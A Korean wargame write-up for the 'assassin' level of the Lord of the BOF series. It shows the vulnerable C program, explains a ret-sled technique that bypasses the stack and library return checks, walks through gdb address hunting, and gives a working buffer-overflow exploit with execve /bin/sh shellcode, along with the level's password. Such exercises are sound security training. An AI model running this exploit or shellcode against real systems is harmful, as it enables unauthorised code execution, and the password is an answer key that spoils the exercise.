# assassin

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - assassin
        - no stack, no RTL
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack retbayed you!\n");
                exit(0);
        }

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer+sfp hunter
        memset(buffer, 0, 44);
}
```

새로운 접근법을 공부할 수 있는 문제이다. 

ret sled라는 기법인데 ret자리에 다시 ret의 주소를 넣어 esp가 4증가한 상태에서 ret명령을 한 번 더 실행하므로 ret부분 뒤에 넣은 주소로 한 번 더 이동하게 된다. 따라서 &ret+ &shellcode+shellcode식으로 넣어주게 되면 ret이 두 번 호출되면서 shellcode의 주소로 이동해 shellcode를 실행시킬 수 있는 구조가 만들어진다. 

쉬운 내용이지만 모르면 접근할 수 없다. argv의 개수 제한이 없고 ret에 대한 제한이 있다면 접근하기 좋은 기법이니 기억하도록 하자. 

먼저, ret의 주소와 shellcode의 주소를 구해보도록 하자. 

```bash
[giant@localhost giant]$ ls
assassin  assassin.c
[giant@localhost giant]$ cp assassin bbbbbbbb
[giant@localhost giant]$ gdb -q bbbbbbbb
```

```assembly
(gdb) b*main
Breakpoint 1 at 0x8048470
(gdb) set disassembly-flavor intel
(gdb) disas main
...생략...
0x804850f <main+159>:   push   0
0x8048511 <main+161>:   lea    %eax,[%ebp-40]
0x8048514 <main+164>:   push   %eax
0x8048515 <main+165>:   call   0x8048398 <memset>
0x804851a <main+170>:   add    %esp,12
0x804851d <main+173>:   leave
0x804851e <main+174>:   ret
0x804851f <main+175>:   nop
```

ret의 주소는 0x804851e이다. 이제 입력값을 주고 실행시켜서 shellcode를 넣을 주소를 알아보자.

```assembly
(gdb) r `python -c 'print "c"*44+"\x1e\x85\x04\x08"+"d"*44'`
Starting program: /home/giant/bbbbbbbb `python -c 'print "c"*44+"\x1e\x85\x04\x08"+"d"*44'`

Breakpoint 1, 0x8048470 in main ()
(gdb) x/100x $esp
...
0xbffffbfc:     0x00000000      0x00000000      0x69000000      0x00363836
0xbffffc0c:     0x6d6f682f      0x69672f65      0x2f746e61      0x62626262
0xbffffc1c:     0x62626262      0x63636300      0x63636363      0x63636363
0xbffffc2c:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffc3c:     0x63636363      0x63636363      0x63636363      0x63636363
0xbffffc4c:     0x04851e63      0x64646408      0x64646464      0x64646464
0xbffffc5c:     0x64646464      0x64646464      0x64646464      0x64646464
0xbffffc6c:     0x64646464      0x64646464      0x64646464      0x64646464
```

d(64)가 시작하는 부분인 0xbffffc51이 shellcode의 시작 주소가 될 것이다.

```bash
[giant@localhost giant]$ ./assassin `python -c 'print "c"*44+"\x1e\x85\x04\x08"+"\x51\xfc\xff\xbf"+"\x90"*13+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
ccccccccccccccccccccccccccccccccccccccccccccQ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                                                                 ̀1▒̀
bash$ whoami
assassin
bash$ my-pass
euid = 515
pushing me away
```

assassin의 password는 pushing me away이다.

